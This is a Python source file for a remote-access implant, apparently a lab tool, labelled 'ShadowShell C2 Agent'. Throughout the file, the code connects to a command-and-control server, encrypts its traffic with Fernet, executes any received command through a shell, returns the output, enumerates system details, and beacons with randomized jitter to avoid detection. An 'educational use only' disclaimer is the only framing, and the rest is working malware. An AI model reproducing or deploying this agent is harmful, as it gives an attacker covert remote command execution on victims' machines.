import socket
import subprocess
import argparse
import time
import random
import platform
import os
from cryptography.fernet import Fernet

# ShadowShell C2 Agent (Encrypted + Beaconing)
# Educational use only. Authorized lab testing only.

def load_key():
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        print("[-] secret.key not found. Run generate_key.py first!")
        exit(1)

def get_sysinfo():
    # Basic system enumeration for post-exploitation
    info = f"""
    Hostname: {platform.node()}
    OS: {platform.system()} {platform.release()}
    User: {os.getenv('USER', 'unknown')}
    Arch: {platform.machine()}
    """
    return info

def connect_to_server(host, port, fernet, sleep_time, jitter_percent):
    # The first beacon is just a check-in message
    pending_output = b"ShadowShell Agent checked in. Awaiting commands.\n"
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # 1. Send pending output (or initial check-in) - ENCRYPTED
            encrypted_output = fernet.encrypt(pending_output)
            sock.send(encrypted_output)
            
            # 2. Receive encrypted command
            encrypted_cmd = sock.recv(4096)
            try:
                cmd = fernet.decrypt(encrypted_cmd).decode('utf-8')
            except Exception:
                break # Exit if we can't decrypt
            
            # 3. Process command
            if cmd.lower() == 'exit':
                break
            
            # 4. Execute command
            if cmd.lower() == 'sysinfo':
                pending_output = get_sysinfo().encode('utf-8')
            else:
                try:
                    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    if not result:
                        result = "[*] Command executed successfully (no output).\n"
                    pending_output = result.encode('utf-8')
                except Exception as e:
                    pending_output = f"[-] Error executing command: {e}\n".encode('utf-8')
            
            sock.close()
            
            # 5. Sleep with jitter before next check-in
            # Jitter is calculated as a percentage of the sleep time
            jitter = random.uniform(-jitter_percent, jitter_percent) * sleep_time
            actual_sleep = max(1, sleep_time + jitter) # Ensure at least 1 second sleep
            time.sleep(actual_sleep)
            
        except ConnectionRefusedError:
            print("[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Error: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowShell C2 Agent")
    parser.add_argument("--host", default="127.0.0.1", help="C2 Server IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=4444, help="C2 Server Port (default: 4444)")
    parser.add_argument("--sleep", type=int, default=5, help="Beacon sleep interval in seconds (default: 5)")
    parser.add_argument("--jitter", type=float, default=0.2, help="Jitter percentage (0.2 = 20%%)")
    args = parser.parse_args()
    
    key = load_key()
    fernet = Fernet(key)
    
    print(f"[*] Starting ShadowShell agent. Sleep: {args.sleep}s, Jitter: {args.jitter*100}%")
    connect_to_server(args.host, args.port, fernet, args.sleep, args.jitter)
